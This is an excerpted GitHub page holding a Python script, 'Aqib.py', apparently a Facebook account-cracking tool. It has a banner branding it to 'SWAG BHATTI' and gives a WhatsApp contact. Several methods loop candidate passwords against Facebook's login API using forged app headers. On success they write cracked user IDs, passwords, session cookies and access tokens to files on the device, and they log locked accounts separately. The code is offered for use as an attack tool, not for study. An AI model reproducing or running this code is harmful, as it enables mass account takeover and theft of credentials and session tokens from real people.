...
Security
Insights
Open-source-by-Adi/Aqib.py
@Mradi007
Mradi007 Add files via upload
 1 contributor
1061 lines (985 sloc)  35.6 KB
#coding = utf-8
...
\33[1;34m `7MM"""Yp, `7MMF'  `7MMF'      db   MMP""MM""YMM MMP""MM""YMM `7MMF'
\33[1;97m MM    Yb   MM      MM       ;MM:  P'   MM   `7 P'   MM   `7   MM  
\33[1;32m MM    dP   MM      MM      ,V^MM.      MM           MM        MM  
\33[1;36m MM"""bg.   MMmmmmmmMM     ,M  `MM      MM           MM        MM  
\33[1;34m MM    `Y   MM      MM     AbmmmqMA     MM           MM        MM  
\33[1;97m MM    ,9   MM      MM    A'     VML    MM           MM        MM  
\33[1;32m .JMMmmmd9  .JMML.  .JMML..AMA.   .AMMA..JMML.       .JMML.    .JMML.
                                                                    
                                                                    
                                                                    
\33[1;36m---------------------------------------------------
 \33[1;34m Owner     >>    SWAG BHATTI
 \33[1;97m Whatsapp   >>    03228870029
 \33[1;32m Team     >>    MSF BRAND
...
class iAmMain:
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SWAG] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;91m[SWAG-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SWAG_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SWAG] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[SWAG-OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/SWAG_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SWAG_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SWAG-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SWAG_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SWAG %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SWAG-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SWAG_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SWAG_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SWAG-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SWAG_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SWAG] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SWAG-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SWAG_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SWAG_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SWAG-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SWAG_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SWAG] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[SWAG-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SWAG_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SWAG_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SWAG-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SWAG_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
class Join:
	def __init_(self):
		logo()
		#s.system("xdg-open https://wa.me/+923228870029")
	def Whatsapp(self):
		os.system('xdg-open https://chat.whatsapp.com')
		iAmMain().iAmMenu()
	def Facebook(self):
		os.system('xdg-open https://www.facebook.com/swag.bhatti.5')
		iAmMain().iAmMenu()
